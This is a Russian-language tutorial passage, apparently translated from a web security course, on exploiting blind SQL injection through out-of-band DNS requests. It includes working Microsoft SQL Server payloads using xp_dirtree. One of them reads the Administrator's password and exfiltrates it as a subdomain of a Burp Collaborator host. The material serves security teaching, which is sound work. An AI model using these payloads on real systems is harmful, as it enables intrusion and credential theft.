Приложение может выполнять SQL-запрос асинхронно, что предотвращает возможность эксплуатации через ожидания. Ответ приложения не зависит от того, возвращает ли запрос какие-либо данные, возникает ли ошибка базы данных или от времени выполнения запроса.

В этой ситуации часто можно использовать уязвимость слепой SQLi, инициируя out-of-band сетевые взаимодействия с системой. Их можно запускать на основе внедрённого условия, чтобы выводить информацию по частям.

Для этой цели можно использовать различные сетевые протоколы, но обычно наиболее эффективным является DNS. Многие производственные сети допускают свободный исходящий трафик DNS-запросов, поскольку они необходимы для нормальной работы производственных систем.

Методы инициирования DNS-запроса зависят от типа используемой базы данных. Например, следующий ввод в Microsoft SQL Server можно использовать, чтобы вызвать DNS-запрос к указанному домену:
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Это заставляет базу данных выполнить запрос к следующему домену:
```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Можете использовать out-of-band канал для извлечения данных из уязвимого приложения. Например:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Этот ввод считывает пароль пользователя Administrator, добавляет уникальный поддомен и инициирует DNS-запрос. Этот запрос позволяет вам увидеть перехваченный пароль:
```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
